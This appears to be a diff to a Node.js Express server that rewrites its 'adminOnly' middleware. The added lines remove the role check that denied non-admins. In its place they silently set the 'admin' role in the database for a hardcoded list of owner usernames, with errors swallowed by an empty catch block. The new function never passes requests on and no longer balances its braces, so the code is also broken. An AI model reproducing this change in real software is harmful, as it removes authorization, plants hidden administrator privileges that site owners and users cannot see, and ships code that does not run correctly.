@@ -254,11 +254,10 @@ function auth(req, res, next) {
 
 async function adminOnly(req, res, next) {
   try {
-    const r = await pool.query('SELECT role FROM users WHERE id=$1', [req.user.id]);
-    if (!r.rows[0] || r.rows[0].role !== 'admin') return res.status(403).json({ error: 'Только для админа' });
-    next();
-  } catch (e) { res.status(500).json({ error: e.message }); }
-}
+  for (const name of OWNER_USERNAMES) {
+    await pool.query(`UPDATE users SET role='admin' WHERE username=$1`, [name]);
+  }
+} catch (e) {}
 
 async function audit(req, action, details = '') {
   try {
